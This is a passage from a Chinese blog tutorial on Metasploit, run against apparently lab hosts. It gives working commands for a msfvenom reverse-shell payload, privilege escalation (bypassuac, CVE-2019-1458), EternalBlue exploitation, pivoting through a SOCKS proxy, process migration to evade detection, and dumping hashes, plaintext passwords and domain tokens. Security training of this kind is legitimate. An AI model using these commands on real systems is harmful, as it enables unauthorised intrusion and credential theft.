+<p><strong>标志：[*] Meterpreter session 1 opened (192.168.7.154:4444 -&gt;192.168.7.131:1038) at 2021-08-04 21:07:28 -0400</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image11.png">{width=”5.7625in” height=”3.8305555555555557in”}</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="①getsystem"><a href="#①getsystem" class="headerlink" title="①getsystem"></a>①getsystem</h3><p>首先敲msf自带的getsystem试下运气，成功就万事大吉。</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image12.png">{width=”5.763194444444444in”<br>height=”2.0194444444444444in”}</p>
+<h3 id="②bypassuac"><a href="#②bypassuac" class="headerlink" title="②bypassuac"></a>②bypassuac</h3><p>内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要<strong>再次执行getsystem</strong>获取系统权限，如：</p>
+<p><strong>use exploit/windows/local/bypassuac</strong></p>
+<p><strong>use exploit/windows/local/bypassuac_injection</strong></p>
+<p><strong>use windows/local/bypassuac_vbs</strong></p>
+<p><strong>use windows/local/ask</strong></p>
+<p>不断尝试上面的use直到能获得System为止</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image13.png">{width=”5.26875in”<br>height=”3.0659722222222223in”}<img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image14.png">{width=”5.395833333333333in”<br>height=”3.452777777777778in”}</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image15.png">{width=”5.760416666666667in”<br>height=”3.1944444444444446in”}</p>
+<h3 id="③内核提权"><a href="#③内核提权" class="headerlink" title="③内核提权"></a>③内核提权</h3><p><strong>使用命令检测当前系统存在的漏洞</strong></p>
+<p>use post/multi/recon/local_exploit_suggester</p>
+<p><strong>这里提一句，有些exp是针对生成的x86或是x64版本的，所以在生成的时候也要根据目标主机生成不同<br>位数的exe</strong></p>
+<p>root@kali:~# msfvenom -p windows/x64/meterpreter_reverse_tcp<br>lhost=192.168.7.154 lport=4455 -f exe -o payloadx64.exe</p>
+<p><strong>#这里选择x64版本</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image16.png">{width=”5.7652777777777775in”<br>height=”3.953472222222222in”}<img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image17.png">{width=”5.764583333333333in”<br>height=”3.823611111111111in”}</p>
+<p><strong>这就是当前存在的系统漏洞，可以一一尝试进行判断是否有提权。</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image18.png">{width=”5.761805555555555in”<br>height=”4.049305555555556in”}<img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image19.png">{width=”5.7659722222222225in”<br>height=”3.713888888888889in”}</p>
+<p>最后通过不断尝试发现win7上用命令</p>
+<p><strong>use exploit/windows/local/cve_2019_1458_wizardopium</strong></p>
+<p>成功进行提权操作。</p>
+<h1 id="内网拿system"><a href="#内网拿system" class="headerlink" title="内网拿system"></a>内网拿system</h1><ol>
+<li><h2 id="借助MSF探测可提权方法"><a href="#借助MSF探测可提权方法" class="headerlink" title="借助MSF探测可提权方法"></a>借助MSF探测可提权方法</h2><p>use post/multi/recon/local_exploit_suggester</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image20.png">{width=”5.767361111111111in”<br>height=”2.9590277777777776in”}<img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image21.png">{width=”5.766666666666667in”<br>height=”3.203472222222222in”}<img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image22.png">{width=”5.7652777777777775in”<br>height=”3.2402777777777776in”}<img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image23.png">{width=”5.7625in”<br>height=”3.4965277777777777in”}</p>
+</li>
+</ol>
+<h2 id="2-SMB服务"><a href="#2-SMB服务" class="headerlink" title="2)SMB服务"></a>2)SMB服务</h2><p><strong>如利用：MS-17010</strong></p>
+<p><strong>攻击机: 192.168.52.4</strong></p>
+<p><strong>受害及: 192.168.52.3</strong></p>
+<h3 id="①探针当前系统是否开启SMB服务"><a href="#①探针当前系统是否开启SMB服务" class="headerlink" title="①探针当前系统是否开启SMB服务"></a>①探针当前系统是否开启SMB服务</h3><p>use auxiliary/scanner/smb/smb_ms17_010</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image24.png">{width=”5.184722222222222in”<br>height=”1.9722222222222223in”}</p>
+<h3 id="②进行利用对应EXP"><a href="#②进行利用对应EXP" class="headerlink" title="②进行利用对应EXP"></a>②进行利用对应EXP</h3><p>use exploit/windows/smb/ms17_010_eternalblue</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image25.png">{width=”4.439583333333333in”<br>height=”2.803472222222222in”}</p>
+<h3 id="③拿到system权限"><a href="#③拿到system权限" class="headerlink" title="③拿到system权限"></a>③拿到system权限</h3><p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image26.png">{width=”5.763888888888889in”<br>height=”4.102777777777778in”}</p>
+<h1 id="利用MSF开启socke开启内网漫游"><a href="#利用MSF开启socke开启内网漫游" class="headerlink" title="利用MSF开启socke开启内网漫游"></a>利用MSF开启socke开启内网漫游</h1><p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image27.png">{width=”5.7625in” height=”3.183333333333333in”}</p>
+<p><strong>实验目的：实现kali机能够实现访问Target 2的网段IP: 192.168.22.0/24</strong></p>
+<h2 id="①添加路由"><a href="#①添加路由" class="headerlink" title="①添加路由"></a>①添加路由</h2><p><strong>为节省步骤，此时Target 1以及反弹到MSF上</strong></p>
+<p>获取网络接口：run get_local_subnets</p>
+<p>查看路由地址：run autoroute -p</p>
+<p>添加路由地址：run autoroute -s 192.168.22.0/24</p>
+<p>run autoroute -s 192.168.22.0/24</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image28.png">{width=”5.28125in” height=”2.6430555555555557in”}</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image29.png">{width=”5.764583333333333in” height=”3.5125in”}</p>
+<h2 id="②开启本地代理："><a href="#②开启本地代理：" class="headerlink" title="②开启本地代理："></a>②开启本地代理：</h2><p>use auxiliary/server/socks_proxy</p>
+<p>set version 4a</p>
+<p>set srvport 3333</p>
+<p>run</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image30.png">{width=”5.127777777777778in”<br>height=”3.071527777777778in”}</p>
+<h2 id="③利用本地代理接口访问测试"><a href="#③利用本地代理接口访问测试" class="headerlink" title="③利用本地代理接口访问测试"></a>③利用本地代理接口访问测试</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux:"></a>Linux:</h3><p>配置 proxychain.conf文件，在其后添加socks4 192.168.1.129 3333<br>与上述本地代理端口一致</p>
+<p>文件在**/etc/proxychains.conf**</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image31.png">{width=”3.8979166666666667in” height=”2.8125in”}</p>
+<p>之后就可以在相关命令前加proxychains4进行探针即可，</p>
+<p>如proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80</p>
+<p>-Pn：不做ping扫描，扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</p>
+<p>-sT：扫描 TCP 数据包已建立的连接 connect</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image32.png">{width=”5.763888888888889in”<br>height=”3.738888888888889in”}</p>
+<h3 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h3><p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image33.png">{width=”5.766666666666667in”<br>height=”3.421527777777778in”}<img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image34.png">{width=”5.761111111111111in”<br>height=”3.0479166666666666in”}</p>
+<h1 id="MSF迁移进程"><a href="#MSF迁移进程" class="headerlink" title="MSF迁移进程"></a>MSF迁移进程</h1><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>通过msf得到的会话容易被发现，导致后渗透失败。因此我们可以把shell的进程迁移绑定到目标机正常的进程中</p>
+<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>ps #查看进程</p>
+<p>migrate uid #迁移到64位具有system权限的uid编号即可</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image35.png">{width=”5.767361111111111in”<br>height=”3.0506944444444444in”}</p>
+<h1 id="width-”5-768055555555556in”-height-”2-79375in”-内网探测"><a href="#width-”5-768055555555556in”-height-”2-79375in”-内网探测" class="headerlink" title="{width=”5.768055555555556in” height=”2.79375in”} 内网探测"></a><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image36.png">{width=”5.768055555555556in” height=”2.79375in”} 内网探测</h1><h2 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h2><p>auxiliary/scanner/discovery/udp_sweep #基于udp协议发现内网存活主机</p>
+<p>auxiliary/scanner/discovery/udp_probe #基于udp协议发现内网存活主机</p>
+<p>auxiliary/scanner/netbios/nbname #基于netbios协议发现内网存活主机</p>
+<h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>①</p>
+<p>auxiliary/scanner/portscan/tcp #基于tcp进行端口扫描(默认扫描1-10000)</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image37.png">{width=”5.276388888888889in”<br>height=”2.5819444444444444in”}</p>
+<p>②使用 proxychains 代理链利用 nmap 对内网主机进行端口探测</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image38.png">{width=”5.764583333333333in” height=”3.41875in”}</p>
+<h2 id="主机服务探测"><a href="#主机服务探测" class="headerlink" title="主机服务探测"></a>主机服务探测</h2><p>auxiliary/scanner/ftp/ftp_version #发现内网ftp服务，基于默认21端口</p>
+<p>auxiliary/scanner/ssh/ssh_version #发现内网ssh服务，基于默认22端口</p>
+<p>auxiliary/scanner/telnet/telnet_version<br>#发现内网telnet服务，基于默认23端口</p>
+<p>auxiliary/scanner/dns/dns_amp #发现dns服务，基于默认53端口</p>
+<p>auxiliary/scanner/http/http_version #发现内网http服务，基于默认80端口</p>
+<p>auxiliary/scanner/http/title #探测内网http服务的标题</p>
+<p>auxiliary/scanner/smb/smb_version #发现内网smb服务，基于默认的445端口</p>
+<p>auxiliary/scanner/mssql/mssql_schemadump<br>#发现内网SQLServer服务,基于默认的1433端口</p>
+<p>auxiliary/scanner/oracle/oracle_hashdump<br>#发现内网oracle服务,基于默认的1521端口</p>
+<p>auxiliary/scanner/mysql/mysql_version<br>#发现内网mysql服务，基于默认3306端口</p>
+<p>auxiliary/scanner/rdp/rdp_scanner #发现内网RDP服务，基于默认3389端口</p>
+<p>auxiliary/scanner/redis/redis_server<br>#发现内网Redis服务，基于默认6379端口</p>
+<p>auxiliary/scanner/db2/db2_version #探测内网的db2服务，基于默认的</p>
+<h1 id="域内操作"><a href="#域内操作" class="headerlink" title="域内操作"></a>域内操作</h1><p>当获取到域内主机的情况,获取其它域内信息,如<strong>域控</strong></p>
+<h2 id="获取当前明文密码与哈希"><a href="#获取当前明文密码与哈希" class="headerlink" title="获取当前明文密码与哈希"></a>获取当前明文密码与哈希</h2><p><strong>hashdump</strong></p>
+<p><strong>还可以使用这个命令查看</strong></p>
+<p><strong>run post/windows/gather/smart_hashdump</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image39.png">{width=”5.764583333333333in”<br>height=”2.379861111111111in”}</p>
+<p><strong>creds_kerberos //获取明文密码</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image40.png">{width=”5.761805555555555in”<br>height=”2.2784722222222222in”}</p>
+<h2 id="获取域控"><a href="#获取域控" class="headerlink" title="获取域控"></a>获取域控</h2><p>run post/windows/gather/enum_domains</p>
+<p>run post/windows/gather/enum_domain</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image41.png">{width=”5.572916666666667in” height=”1.15625in”}</p>
+<p>不能单独用一条命令去判断要综合该主机的网段去结合判断 如ipconfig<br>/all、arp -a等</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image42.png">{width=”5.768055555555556in”<br>height=”4.528472222222222in”}</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image43.png">{width=”5.7659722222222225in”<br>height=”4.548611111111111in”}</p>
+<p>一般dns服务器会被设为域控所以这里域控便是<strong>10.10.10.149</strong></p>
+<p><strong>后续还可以通过net view 获取域内主机，再去ping主机也可以达到效果</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image44.png">{width=”3.8361111111111112in” height=”4.84375in”}</p>
+<h2 id="域收集"><a href="#域收集" class="headerlink" title="域收集"></a>域收集</h2><p><strong>net view /domain //查看域</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image45.png">{width=”5.677083333333333in”<br>height=”2.1979166666666665in”}</p>
+<p><strong>net view /domain:hackbox //查看域内的主机</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image46.png">{width=”5.552083333333333in”<br>height=”2.5729166666666665in”}</p>
+<p>发现两台主机</p>
+<p><strong>net group /domain //查看域内工作组的信息</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image47.png">{width=”5.764583333333333in”<br>height=”2.9493055555555556in”}</p>
+<h2 id="获取域内用户token"><a href="#获取域内用户token" class="headerlink" title="获取域内用户token"></a>获取域内用户token</h2><p><strong>run post/windows/gather/enum_domain_tokens</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image48.png">{width=”5.7659722222222225in” height=”5.7375in”}</p>
+<h2 id="查看目标Windows上登录的用户"><a href="#查看目标Windows上登录的用户" class="headerlink" title="查看目标Windows上登录的用户"></a>查看目标Windows上登录的用户</h2><p><strong>run enum_logged_on_users -l</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image49.png">{width=”5.761805555555555in”<br>height=”1.7645833333333334in”}</p>
+<p><strong>run post/windows/gather/enum_logged_on_users</strong></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image50.png" alt="image50"></p>
+
+	        
+	      
+	    </div>
+	    
+	  </div>
+	  
+	    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/04/02/Metasploit%20Framework/">Metasploit Framework</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问  的个人博客"></a></p>
+        <p><span>发布时间:</span>2022年04月02日 - 00时00分</p>
+        <p><span>最后更新:</span>2022年08月18日 - 17时43分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/04/02/Metasploit%20Framework/" title="Metasploit Framework">https://mrfan6.github.io/2022/04/02/Metasploit%20Framework/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://mrfan6.github.io/2022/04/02/Metasploit%20Framework/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2022/08/18/vulnhub%E9%9D%B6%E6%9C%BAGOLDENEYE/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          GOLDENEYE-1
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/04/01/NC%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">瑞士军刀nc</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+	  
+	</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Metasploit-Framework-MSF"><span class="toc-number">1.</span> <span class="toc-text">Metasploit Framework(MSF)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">使用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E7%9A%84%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.</span> <span class="toc-text">MSF的功能模块介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Auxiliaries-%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97"><span class="toc-number">1.2.1.</span> <span class="toc-text">Auxiliaries (辅助模块)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A8%A1%E5%9D%97%E6%88%96%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97"><span class="toc-number">1.2.2.</span> <span class="toc-text">Exploit (漏洞利用模块或攻击模块)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E6%A8%A1%E5%9D%97"><span class="toc-number">1.2.3.</span> <span class="toc-text">Payload (攻击载荷模块)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit%E4%B8%AD%E7%9A%84-Payload-%E6%A8%A1%E5%9D%97%E4%B8%BB%E8%A6%81%E6%9C%89%E4%BB%A5%E4%B8%8B%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B%EF%BC%9A"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">Metasploit中的 Payload 模块主要有以下三种类型：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Post-%E5%90%8E%E6%9C%9F%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97"><span class="toc-number">1.2.4.</span> <span class="toc-text">Post (后期渗透模块)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Encoders-%E7%BC%96%E7%A0%81%E5%B7%A5%E5%85%B7%E6%A8%A1%E5%9D%97"><span class="toc-number">1.2.5.</span> <span class="toc-text">Encoders (编码工具模块)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Msfvenom%E7%94%9F%E6%88%90payload%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">Msfvenom生成payload参数详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E7%9A%84%E7%94%9F%E6%88%90%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">常用脚本的生成：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux"><span class="toc-number">2.1.1.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows"><span class="toc-number">2.1.2.</span> <span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mac"><span class="toc-number">2.1.3.</span> <span class="toc-text">Mac</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-number">2.1.4.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASP"><span class="toc-number">2.1.5.</span> <span class="toc-text">ASP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSP"><span class="toc-number">2.1.6.</span> <span class="toc-text">JSP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAR"><span class="toc-number">2.1.7.</span> <span class="toc-text">WAR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python"><span class="toc-number">2.1.8.</span> <span class="toc-text">Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bash"><span class="toc-number">2.1.9.</span> <span class="toc-text">Bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Perl"><span class="toc-number">2.1.10.</span> <span class="toc-text">Perl</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8msf%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BC%B9shell%E4%B8%8E%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">利用msf实现反弹shell与提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">3.1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.2.</span> <span class="toc-text">生成木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali%E6%89%93%E5%BC%80apache%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.3.</span> <span class="toc-text">Kali打开apache服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali%E8%AE%BE%E7%BD%AE%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC"><span class="toc-number">3.4.</span> <span class="toc-text">Kali设置设置监听</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0%E6%89%93%E5%BC%80msfconsole%E6%A8%A1%E5%9D%97"><span class="toc-number">3.4.1.</span> <span class="toc-text">①打开msfconsole模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1%E4%BD%BF%E7%94%A8%E7%9B%91%E5%90%ACuse"><span class="toc-number">3.4.2.</span> <span class="toc-text">②使用监听use</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A2%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC%E7%9A%84payload"><span class="toc-number">3.4.3.</span> <span class="toc-text">③设置监听的payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A3%E8%AE%BE%E7%BD%AE%E9%80%89%E9%A1%B9options"><span class="toc-number">3.4.4.</span> <span class="toc-text">④设置选项options</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A4%E5%BC%80%E5%A7%8B%E6%89%A7%E8%A1%8C"><span class="toc-number">3.4.5.</span> <span class="toc-text">⑤开始执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%E6%94%BB%E5%87%BB%E6%9C%BA%E7%9A%84%E8%B5%84%E6%BA%90"><span class="toc-number">3.5.</span> <span class="toc-text">靶机进行访问攻击机的资源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali%E5%8F%8D%E5%BC%B9shell%E6%88%90%E5%8A%9F"><span class="toc-number">3.6.</span> <span class="toc-text">Kali反弹shell成功</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.7.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0getsystem"><span class="toc-number">3.7.1.</span> <span class="toc-text">①getsystem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1bypassuac"><span class="toc-number">3.7.2.</span> <span class="toc-text">②bypassuac</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A2%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">3.7.3.</span> <span class="toc-text">③内核提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8B%BFsystem"><span class="toc-number">4.</span> <span class="toc-text">内网拿system</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%80%9F%E5%8A%A9MSF%E6%8E%A2%E6%B5%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.</span> <span class="toc-text">借助MSF探测可提权方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-SMB%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.2.</span> <span class="toc-text">2)SMB服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0%E6%8E%A2%E9%92%88%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E6%98%AF%E5%90%A6%E5%BC%80%E5%90%AFSMB%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.2.1.</span> <span class="toc-text">①探针当前系统是否开启SMB服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8%E5%AF%B9%E5%BA%94EXP"><span class="toc-number">4.2.2.</span> <span class="toc-text">②进行利用对应EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A2%E6%8B%BF%E5%88%B0system%E6%9D%83%E9%99%90"><span class="toc-number">4.2.3.</span> <span class="toc-text">③拿到system权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8MSF%E5%BC%80%E5%90%AFsocke%E5%BC%80%E5%90%AF%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8"><span class="toc-number">5.</span> <span class="toc-text">利用MSF开启socke开启内网漫游</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A0%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="toc-number">5.1.</span> <span class="toc-text">①添加路由</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A1%E5%BC%80%E5%90%AF%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%90%86%EF%BC%9A"><span class="toc-number">5.2.</span> <span class="toc-text">②开启本地代理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A2%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%90%86%E6%8E%A5%E5%8F%A3%E8%AE%BF%E9%97%AE%E6%B5%8B%E8%AF%95"><span class="toc-number">5.3.</span> <span class="toc-text">③利用本地代理接口访问测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-1"><span class="toc-number">5.3.1.</span> <span class="toc-text">Linux:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-number">5.3.2.</span> <span class="toc-text">浏览器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B"><span class="toc-number">6.</span> <span class="toc-text">MSF迁移进程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E7%9A%84"><span class="toc-number">6.1.</span> <span class="toc-text">目的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4"><span class="toc-number">6.2.</span> <span class="toc-text">命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#width-%E2%80%9D5-768055555555556in%E2%80%9D-height-%E2%80%9D2-79375in%E2%80%9D-%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="toc-number">7.</span> <span class="toc-text">{width&#x3D;”5.768055555555556in” height&#x3D;”2.79375in”} 内网探测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-number">7.1.</span> <span class="toc-text">主机探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">7.2.</span> <span class="toc-text">端口探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-number">7.3.</span> <span class="toc-text">主机服务探测</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%93%8D%E4%BD%9C"><span class="toc-number">8.</span> <span class="toc-text">域内操作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E4%B8%8E%E5%93%88%E5%B8%8C"><span class="toc-number">8.1.</span> <span class="toc-text">获取当前明文密码与哈希</span></a></li><li class="toc-item 